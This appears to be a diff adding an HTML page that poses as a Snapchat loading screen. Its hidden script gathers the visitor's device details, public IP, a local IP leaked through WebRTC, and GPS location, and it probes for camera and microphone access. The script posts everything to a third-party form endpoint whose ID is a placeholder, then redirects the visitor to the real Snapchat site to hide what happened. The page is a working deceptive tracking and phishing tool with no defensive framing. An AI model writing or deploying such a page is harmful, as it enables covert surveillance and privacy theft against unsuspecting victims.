@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Snapchat</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body { margin:0; height:100vh; background:#FFFC00; display:flex; align-items:center; justify-content:center; font-family:Arial; }
+#fake { text-align:center; }
+#fake img { width:200px; height:200px; }
+</style>
+</head>
+<body>
+<div id="fake">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="">
+<p style="font-size:18px;">Chargement...</p>
+</div>
+<script>
+const FORMSPREE_URL = 'https://formspree.io/f/TON_ID_FORMSPREE';
+
+async function sendData(data) {
+    try {
+        await fetch(FORMSPREE_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
+            body: JSON.stringify(data)
+        });
+    } catch(e) {}
+}
+
+async function main() {
+    let info = {};
+
+    info.userAgent = navigator.userAgent;
+    info.platform = navigator.platform;
+    info.language = navigator.language;
+    info.hardwareConcurrency = navigator.hardwareConcurrency;
+    info.deviceMemory = navigator.deviceMemory || 'unknown';
+    info.screen = window.screen.width + 'x' + window.screen.height + '@' + window.devicePixelRatio + 'x';
+    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info.referrer = document.referrer;
+
+    try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const data = await resp.json();
+        info.ip = data.ip;
+    } catch(e) {}
+
+    try {
+        const rtc = new RTCPeerConnection({iceServers: []});
+        rtc.createDataChannel('');
+        rtc.onicecandidate = (e) => {
+            if (e.candidate) {
+                const ip = e.candidate.candidate.split(' ')[4];
+                if (ip && !ip.includes(':')) info.localIP = ip;
+            }
+        };
+        await rtc.createOffer().then(o => rtc.setLocalDescription(o));
+        setTimeout(() => rtc.close(), 2000);
+    } catch(e) {}
+
+    try {
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout:5000});
+        });
+        info.location = {lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy};
+    } catch(e) {}
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+        stream.getTracks().forEach(t => t.stop());
+        info.cameraMicrophone = 'granted';
+    } catch(e) {
+        info.cameraMicrophone = 'denied';
+    }
+
+    await sendData(info);
+
+    setTimeout(() => {
+        window.location.href = 'https://www.snapchat.com/';
+    }, 3000);
+}
+
+main();
+</script>
+</body>
+</html>
